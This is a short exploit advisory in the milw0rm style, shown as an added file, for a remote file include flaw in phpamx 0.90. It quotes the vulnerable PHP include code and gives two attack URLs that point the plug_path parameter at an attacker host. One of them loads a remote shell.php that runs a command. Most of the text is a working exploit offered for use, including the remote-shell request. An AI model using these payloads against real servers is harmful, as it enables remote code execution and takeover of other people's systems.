@@ -1,0 +1,32 @@
+## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ##
+#                                                               #
+#           [ phpamx 0.90 ]                                     #
+#                                                                
+# Class:     Remote|Local File Include Vulnerability            #
+# Patch:     Unavailable                                        #
+# Published  2006/10/18                                         #
+# Remote:    Yes                                                
+# Local:     No       						#
+# Type:      High                                               #
+# Site:      http://sourceforge.net/projects/phpamx/            #
+# Author:    MP
+# Contact:   mp01010@yahoo.com     				#
+#        							#
+#################################################################
+
+Vuln Code
+ (php/plugins/main.php):
+<?php
+include($plug_path."!playtime_top15.php");
+include($plug_path."!mapcycle_list.php");
+//nothing here
+?>
+
+#Vuln 1.0 -> require register_globals = On
+http://victim.com/phpamx-0.9.0/php/plugins/main.php?plug_path=http://attacker.com/
+
+
+#Vuln 2.0 -> require magic_quotes_gpc = Off
+http://victim.com/phpamx-0.9.0/php/plugins/main.php?plug_path=http://attacker.com/shell.php?cmd=pwd%00
+
+# milw0rm.com [2006-10-18]
